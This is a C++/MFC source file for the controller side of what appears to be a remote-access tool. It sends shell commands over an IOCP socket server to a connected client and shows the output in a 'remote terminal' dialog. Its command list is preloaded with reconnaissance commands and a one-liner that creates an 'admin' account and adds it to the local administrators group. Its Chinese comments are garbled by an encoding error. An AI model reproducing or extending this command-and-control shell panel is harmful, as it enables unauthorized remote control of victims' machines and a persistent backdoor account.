// ShellDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Server.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "IOCPServer.h"
#include "../Common/common.h"
#include "../Common/DataStruct.h"
// CShellDlg �Ի���

IMPLEMENT_DYNAMIC(CShellDlg, CDialogEx)

CShellDlg::CShellDlg(CWnd* pParent, CIOCPServer* pIOCPServer, tagClientContext* pClientContext)
	: CDialogEx(CShellDlg::IDD, pParent)
{
    m_pIOCPServer = pIOCPServer;
    m_pClientContext = pClientContext;
    m_csIp = inet_ntoa(pClientContext->addr.sin_addr);
}

CShellDlg::~CShellDlg()
{
}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
    CDialogEx::DoDataExchange(pDX);
    DDX_Control(pDX, COMBOX_COMMAN, m_ComBox);
    DDX_Control(pDX, IDC_EDIT1, m_csText);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialogEx)
    ON_BN_CLICKED(IDOK, &CShellDlg::OnBnClickedOk)
    ON_BN_CLICKED(BN_SendCommand, &CShellDlg::OnBnClickedSendcommand)
    ON_WM_CLOSE()
END_MESSAGE_MAP()


// CShellDlg ��Ϣ�������


void CShellDlg::OnBnClickedOk()
{
    // TODO:  �ڴ���ӿؼ�֪ͨ����������
    //CDialogEx::OnOK();
}


BOOL CShellDlg::OnInitDialog()
{
    CDialogEx::OnInitDialog();

    // TODO:  �ڴ���Ӷ���ĳ�ʼ��

    CString str;
    str.Format(_T("%s---Զ���ն�"), m_csIp);
    SetWindowText(str);


    m_ComBox.AddString(_T("ver"));
    m_ComBox.AddString(_T("whoami"));
    m_ComBox.AddString(_T("ipconfig"));
    m_ComBox.AddString(_T("systeminfo"));
    m_ComBox.AddString(_T("query user"));
    m_ComBox.AddString(_T("net user"));
    m_ComBox.AddString(_T("net user admin admin /add & net localgroup administrators admin /add"));
    m_ComBox.SetCurSel(0);

    return TRUE;  // return TRUE unless you set the focus to a control
    // �쳣:  OCX ����ҳӦ���� FALSE
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
    // TODO:  �ڴ����ר�ô����/����û���

    if (WM_KEYFIRST <= pMsg->message && pMsg->message <= WM_KEYLAST)
    {
        if (pMsg->wParam == VK_RETURN && m_ComBox.IsChild(GetFocus()))
        {
            OnBnClickedSendcommand();
            return TRUE;
        }
    }
    return CDialogEx::PreTranslateMessage(pMsg);
}

void CShellDlg::OnReceive()
{
    char Type;
    m_pClientContext->m_CompressBuffer.Read((PBYTE)&Type, sizeof(char));
    switch (Type)
    {
    case COMMAND_CMD_DATA:
        GetData();
        break;
    default:
        break;
    }

}


void CShellDlg::OnBnClickedSendcommand()
{
    // TODO:  �ڴ���ӿؼ�֪ͨ����������
    CString csCommand;
    DWORD dwReadBytes = 0;
    m_ComBox.GetWindowText(csCommand);
    if (!csCommand.IsEmpty())
    {
        csCommand += _T("\n");
        string szstr = UnicodeToAscii(csCommand.GetString());
        int nLen = szstr.length() + 1;
        char* pBuf = new char[nLen];
        if (pBuf==NULL)
        {
            return;
        }
        memset(pBuf, 0, nLen);
        pBuf[0] = COMMAND_CMD_DATA;
        memcpy(pBuf + 1, (char*)szstr.data(), szstr.length());
        m_pIOCPServer->Send(m_pClientContext, pBuf, nLen);
    }
}


void CShellDlg::OnClose()
{
    // TODO:  �ڴ������Ϣ�����������/�����Ĭ��ֵ
    m_pClientContext->m_Dialog[0] = 0;
    m_pClientContext->m_Dialog[1] = 0;
    shutdown(m_pClientContext->s, 0);
    closesocket(m_pClientContext->s);
    CDialogEx::OnClose();
}

void CShellDlg::OnSend()
{
    //���߿ͻ�����׼������
    char Type = COMMAND_CMD_BEGIN;
    m_pIOCPServer->Send(m_pClientContext, &Type, sizeof(char));
}

void CShellDlg::GetData()
{
    char* szBuf = new char[1024];
    if (szBuf == NULL)
    {
        return;
    }
    memset(szBuf, 0, 1024);
    m_pClientContext->m_CompressBuffer.Read((PBYTE)szBuf, 1024);
    wstring szstr = AsciiToUnicode(szBuf);
    int nLength = m_csText.GetWindowTextLength();
    m_csText.SetSel(nLength, nLength);
    m_csText.ReplaceSel(szstr.c_str());
    m_csText.LineScroll(m_csText.GetLineCount());
}
